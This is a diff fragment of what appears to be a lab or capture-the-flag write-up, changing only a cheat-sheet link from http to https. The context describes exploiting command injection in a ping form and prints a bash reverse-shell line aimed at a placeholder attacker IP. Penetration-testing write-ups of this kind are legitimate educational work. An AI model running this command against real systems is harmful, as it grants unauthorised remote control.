@@ -134,7 +134,7 @@ Let's test this payload in the "ping box".
 
 Did you notice something? If not, then look at the last line of the output highlighted with red box. That **whoami **command we gave actually got executed. Yay, that means we have arbitrary code injection. Now the first thing an attacker generally does after discovering such a command injection vulnerability is to try to get a reverse shell using netcat. I tried the same but it didn't helped. The reason behind that was **either the netcat isn't installed on the target system **or **the current user(apache) does not have permission to execute it**. So we have to look somewhere else. 
 
-So I set up a netcat server listening on my attack machine and executed this command in the ping box for getting a reverse shell. I got this from [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
+So I set up a netcat server listening on my attack machine and executed this command in the ping box for getting a reverse shell. I got this from [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 bash -i >& /dev/tcp/_attacker's_IP**/**port_no_ 0>&1 
 
